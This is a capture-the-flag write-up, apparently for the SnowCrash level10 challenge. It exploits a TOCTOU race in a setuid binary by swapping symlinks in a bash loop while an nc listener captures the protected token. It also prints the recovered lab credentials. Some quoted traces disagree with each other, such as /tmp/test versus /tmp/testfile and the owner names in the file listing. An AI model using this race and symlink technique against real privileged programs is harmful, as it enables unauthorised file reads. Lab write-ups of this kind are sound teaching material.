# Level10 Documentation

## Objective
Exploit a race condition vulnerability in the `level10` binary to read the protected `token` file.


## Approach & Tools
- **Technique**: TOCTOU (Time-of-Check to Time-of-Use) attack via symlink switching
- **Commands**: `ltrace`, `ln`, `nc`,
- **Key Insight**: Binary checks file access permissions separately from opening the file

## Step-by-Step Solution
once we log into level10 account we find a ```level10```nad ```token``` files
```bash
ls -la
```
#### output 
```bash
-rwsr-s---+ 1 flag08  level08 8617 Mar 5 2016 level10
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

### 1. Analyze the Binary with ltrace
We do not have access to the file token. When we execute the binary level10 we get the folloing  result :

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it
```
testing whit /tmp/test:
```bash
level10@SnowCrash:~$ ./level10 /tmp/test 127.0.0.1
Connecting to localhost:6969 .. Unable to connect to host localhost
```

Set Up Listener in auther terminal:
```bash
nc -l 6969
```
### 2.Analyze the Binary with ltrace
```bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/test 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)                           = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1") = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                               = 0
socket(2, 1, 0)                                  = 3
inet_addr("127.0.0.1")                           = 0x0100007f
htons(6969, 1, 0, 0, 0)                          = 14619
connect(3, 0xbffff71c, 16, 0, 0)                 = 0
write(3, ".*( )*.\n", 8)                         = 8
printf("Connected!\nSending file .. "Connected!
)           = 27
fflush(0xb7fd1a20Sending file .. )                               = 0
open("/tmp/test", 0, 010)                        = 4
read(4, "test\n", 4096)                          = 5
write(3, "test\n", 5)                            = 5
puts("wrote file!"wrote file!
)                              = 12
+++ exited (status 12) +++
```
#### Critical Output:
```bash
access("/tmp/testfile", 4)                             = 0  
open("/tmp/testfile", O_RDONLY)                        = 3
```
This reveals the security flaw:

1. First checks access with access()

2. Later opens the file with open()

3. The time gap between these calls is exploitable

### 3 .Exploit the Race Condition
Create Attack Script (/tmp/attack.sh):
```bash
#!/bin/bash
while true; 
do
    ln -sf /tmp/test /tmp/lnk
    ln -sf /home/user/level10/token /tmp/lnk
done &
```
### 4. Execute the Attack
Run exploit in Terminal 1:

```bash
chmod +x /tmp/attack.sh
/tmp/attack.sh
./level10 /tmp/lnk 127.0.0.1
```
Run listener in Terminal 2:

```bash
while true; do nc -l 6969 | grep -v '.*( )*.'; done
```
Output:
```bash
woupa2yuojeeaaed06riuj63c
```
### 5. Retrieve Level11 Token
```bash
su flag10
Password: woupa2yuojeeaaed06riuj63c
getflag
```
#### Output:
```bash
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
### Key Takeaways

* TOCTOU Matters: File operations should be atomic

* Symlink Attacks: Always consider file path manipulation possibilities

* Network Exfiltration: Unintended network features can become attack vectors